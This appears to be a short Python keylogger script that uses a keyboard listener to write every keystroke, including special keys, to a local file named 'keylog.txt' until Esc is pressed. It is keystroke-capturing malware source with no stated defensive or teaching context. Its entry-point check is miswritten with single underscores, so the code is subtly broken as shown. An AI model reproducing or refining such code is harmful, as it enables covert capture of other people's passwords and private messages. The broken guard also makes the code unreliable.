def on_press(key):
    try:
        log_file.write(f'{key.char}')
    except AttributeError:
        if key == keyboard.Key.space:
            log_file.write(' ')
        elif key == keyboard.Key.enter:
            log_file.write('\n')
        else:
            log_file.write(f'[{key.name}]')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Main function
if _name_ == "_main_":
    log_file_path = 'keylog.txt'
    
    # Open the log file in append mode
    with open(log_file_path, 'a') as log_file:
        # Setup the listener
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
